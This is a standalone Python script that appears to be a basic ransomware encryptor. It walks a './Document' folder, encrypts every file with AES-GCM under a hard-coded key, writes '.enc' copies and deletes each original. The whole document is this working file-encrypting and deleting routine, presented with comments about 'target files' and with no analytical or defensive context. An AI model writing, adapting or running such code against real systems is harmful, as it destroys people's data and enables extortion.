import os
import os.path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def encrypt_file(key, in_filename, out_filename=None, chunk_size=64*1024):
    if not out_filename:
        out_filename = in_filename + '.enc'
    iv = get_random_bytes(16)
    encryptor = AES.new(key, AES.MODE_GCM, nonce=iv)
    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(iv)
            while True:
                chunk = infile.read(chunk_size)
                if len(chunk) == 0:
                    break
                outfile.write(encryptor.encrypt(chunk))
            outfile.write(encryptor.digest())
    os.remove(in_filename)

def main():
    # Initialize AES key
    key = b'crystalinfop@sswordfordecryption'

    # Looping through target files
    for root, dirs, files in os.walk('./Document'):
        for file in files:
            path = os.path.join(root, file)
            # Encrypt the file
            print("Encrypting " + path + "...")
            try:
                encrypt_file(key, path)
            except Exception as e:
                print("Error:", e)

if __name__ == "__main__":
    main()
